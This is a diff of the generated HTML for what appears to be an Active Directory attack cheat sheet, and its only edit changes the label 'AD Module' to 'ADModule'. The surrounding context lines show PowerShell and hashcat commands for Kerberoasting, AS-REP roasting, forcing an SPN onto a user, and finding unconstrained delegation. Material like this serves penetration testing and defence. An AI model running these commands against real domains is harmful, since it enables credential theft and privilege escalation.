@@ -298,7 +298,7 @@
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -SPN
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>ServicePrincipalName -ne <span class="s2">"</span><span class="nv">$null</span><span class="s2">"</span><span class="o">}</span> -Properties ServicePrincipalName
 </code></pre></div>    </div>
   </li>
@@ -311,7 +311,7 @@
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Request-SPNTicket
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt-user.corp.local"
 </code></pre></div>    </div>
@@ -355,7 +355,7 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -PreauthNotRequired -Verbose
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>DoesNotRequiredPreAuth -eq <span class="nv">$True</span><span class="o">}</span> -Properties DoesNotRequiredPreAuth
 </code></pre></div>    </div>
   </li>
@@ -400,7 +400,7 @@ hashcat -a 0 -m 18200 user01.ticket wordlist.txt
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -Identity user01 | <span class="nb">select </span>serviceprincipalname
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Identity user01 -Properties ServicePrincipalName | <span class="nb">select </span>ServicePrincipalName
 </code></pre></div>    </div>
   </li>
@@ -413,7 +413,7 @@ hashcat -a 0 -m 18200 user01.ticket wordlist.txt
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainObject -Identity user01 -Set @<span class="o">{</span><span class="nv">serviceprincipalname</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADUser</span> -Identity user01 -ServicePrincipalNames @<span class="o">{</span><span class="nv">Add</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
 </code></pre></div>    </div>
   </li>
@@ -459,7 +459,7 @@ hashcat -a 0 -m 18200 user01.ticket wordlist.txt
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetComputer -UnConstrained
 </code></pre></div>    </div>
   </li>
-  <li>AD Module:
+  <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADComputer</span> -Filter <span class="o">{</span>TrustedForDelegation -eq <span class="nv">$True</span><span class="o">}</span>
 <span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>TrustedForDelegation -eq <span class="nv">$True</span><span class="o">}</span>
 </code></pre></div>    </div>
